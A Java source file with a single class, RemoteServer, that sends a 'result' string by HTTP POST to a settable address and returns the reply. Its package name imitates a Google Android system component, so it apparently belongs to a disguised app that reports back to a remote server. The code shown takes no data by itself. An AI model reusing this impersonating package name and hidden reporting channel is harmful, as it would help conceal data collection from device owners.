package com.google.android.systemUi.helper;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class RemoteServer
{
	private String mConnection;

	public RemoteServer(String serverUri)
	{
		this.mConnection = serverUri;
	}

	public String connect(String result) throws IOException
	{
		String reserved = this.mConnection;
		URL url = new URL(reserved);
		HttpURLConnection connection = (HttpURLConnection)url.openConnection();
		StringBuilder postData = new StringBuilder();
		
		connection.setDoOutput(true);
		connection.setRequestMethod("POST");
		
		if (result != null)
			postData.append("result=" + URLEncoder.encode(result, "UTF-8"));
		
		DataOutputStream oS = new DataOutputStream(connection.getOutputStream());
		
		oS.writeBytes(postData.toString());
		oS.flush();
		oS.close();
		
		if (connection.getResponseCode() != HttpURLConnection.HTTP_OK)
			throw new IOException("HTTP connection error: " + getConnectionAddress());
		
		BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		StringBuilder builder = new StringBuilder();

		String line;

		while ((line = reader.readLine()) != null)
		{
			builder.append(line);
		}

		return builder.toString();
	}

	public String getConnectionAddress()
	{
		return this.mConnection;
	}
	
	public void setConnection(String remoteAddress)
	{
		this.mConnection = remoteAddress;
	}
}
